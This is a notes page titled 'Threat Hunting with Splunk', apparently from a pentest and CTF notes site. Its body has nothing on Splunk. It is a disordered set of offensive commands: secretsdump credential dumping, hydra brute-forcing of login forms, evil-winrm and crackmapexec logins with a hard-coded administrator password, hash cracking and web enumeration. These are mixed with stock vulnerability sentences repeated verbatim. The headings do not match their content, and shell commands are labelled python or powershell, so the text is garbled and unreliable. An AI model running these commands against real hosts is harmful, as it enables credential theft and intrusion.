---
TitleSEO: "Threat Hunting with Splunk | ZureFX"
TitlePost: "Threat Hunting with Splunk"
Author: "ZureFX"
Description: "Personal notes on Threat Hunting with Splunk. Quick reference for pentesting and CTF challenges."
Keywords: "lateral movement, malware, blue team, windows, privilege escalation, dfir"
URL: "https://zurefx.github.io/notes/note-threat-hunting-with-splunk-254.html"
URL_IMAGES: ""
Date: "2025-05-15"
Tags: "Lateral Movement, Malware, Blue Team, Windows, Privilege Escalation, DFIR"
Section: "notes"
Lang: "en"
main_img: "note-threat-hunting-with-splunk-254"
Permalink: "/notes/note-threat-hunting-with-splunk-254.html"
BtnLabel: "Read Notes"
Pick: 0
---
## SMB

### smbexec

- `crackmapexec`
- `IDOR`
- `AS-REP Roasting`
- `metasploit`

Lateral movement was facilitated by reusing discovered credentials across services. The application stored sensitive credentials in an unencrypted configuration file. The kernel version was outdated and vulnerable to a publicly known exploit. The service account had excessive permissions assigned in Active Directory.

- `SUID Binary`
- `Constrained Delegation`
- `NFS No Root Squash`
- `Broken Access Control`

```powershell
impacket-secretsdump administrator:'P@ssw0rd!'@10.32.181.202
feroxbuster -h
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.100.161.67/FUZZ
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.82.162.155 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
```

> **Note:** Path Traversal was identified as the primary attack vector in this scenario.

## smbclient

### Node.js

```python
evil-winrm -i 10.16.69.160 -u administrator -p 'P@ssw0rd!'
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.118.110.233 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
gobuster dir -u http://10.70.27.157/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
```

```python
crackmapexec smb 10.57.60.151 -u administrator -p 'P@ssw0rd!' --shares
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

```bash
crackmapexec smb 10.82.205.170 -u administrator -p 'P@ssw0rd!' --shares
evil-winrm -i 10.110.47.186 -u administrator -p 'P@ssw0rd!'
```

The application stored sensitive credentials in an unencrypted configuration file. The kernel version was outdated and vulnerable to a publicly known exploit. Group Policy Preferences contained encrypted but recoverable credentials. Authentication bypass was achieved through careful manipulation of the login mechanism.

## Constrained Delegation

### RPC

Initial enumeration revealed several interesting open ports on the target. Network traffic analysis revealed unencrypted communications containing user credentials.

```python
gobuster dir -u http://10.28.79.197/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.24.125.225/FUZZ
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.44.209.108/FUZZ
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.25.143.79/FUZZ
```

```python
evil-winrm -i 10.34.199.43 -u administrator -p 'P@ssw0rd!'
gobuster dir -u http://10.61.250.153/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
nmap -sCV -p8443,3389,139 10.76.158.8 -oN scan.txt
evil-winrm -i 10.128.22.216 -u administrator -p 'P@ssw0rd!'
```

## Writable PATH

### PowerShell

```powershell
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.40.29.31 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
feroxbuster -h
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
nmap -sCV -p143,389,389 10.72.250.133 -oN scan.txt
```

```python
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.123.189.67 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
crackmapexec smb 10.51.198.79 -u administrator -p 'P@ssw0rd!' --shares
impacket-secretsdump administrator:'P@ssw0rd!'@10.60.9.172
gobuster dir -u http://10.49.20.46/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
```

Initial enumeration revealed several interesting open ports on the target. The application stored sensitive credentials in an unencrypted configuration file. The target system was identified as running a vulnerable version of the service.

```bash
feroxbuster -h
nmap -sCV -p5432,5986,587 10.21.47.46 -oN scan.txt
feroxbuster -h
```

The scheduled task ran with elevated privileges and could be abused for escalation. The web application was vulnerable to Server-Side Template Injection (SSTI). The web application was vulnerable to Server-Side Template Injection (SSTI). Group Policy Preferences contained encrypted but recoverable credentials. Command injection was possible through unsanitized user input in the search functionality.

## Weak Service Permissions

### Remote File Inclusion

The kernel version was outdated and vulnerable to a publicly known exploit. The target system was identified as running a vulnerable version of the service. Authentication bypass was achieved through careful manipulation of the login mechanism. Unconstrained delegation was enabled on the compromised machine.

```powershell
impacket-secretsdump administrator:'P@ssw0rd!'@10.110.84.20
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.83.218.194/FUZZ
impacket-secretsdump administrator:'P@ssw0rd!'@10.90.242.170
```

> **Note:** GPP Password was identified as the primary attack vector in this scenario.
